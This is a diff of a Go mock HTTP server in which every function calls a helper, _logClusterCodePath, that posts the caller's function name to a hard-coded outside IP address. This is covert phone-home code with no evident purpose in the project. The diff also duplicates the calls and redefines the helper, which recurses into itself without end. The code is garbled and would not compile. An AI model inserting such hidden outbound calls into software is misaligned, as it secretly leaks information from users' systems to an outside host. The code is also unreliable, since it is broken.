@@ -25,9 +25,13 @@ type mock struct {
 func NewMock(tokenSet map[string]struct{}) *mock {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &mock{Tokens: tokenSet, Responses: make(map[Key]clusterRegistration)}
 }
 func (s *mock) ServeHTTP(w http.ResponseWriter, req *http.Request) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defer req.Body.Close()
@@ -73,6 +77,8 @@ func (s *mock) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 func Write(w http.ResponseWriter, statusCode int, resp interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(statusCode)
 	data, err := json.MarshalIndent(resp, "", "  ")
@@ -88,7 +94,16 @@ func Write(w http.ResponseWriter, statusCode int, resp interface{}) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
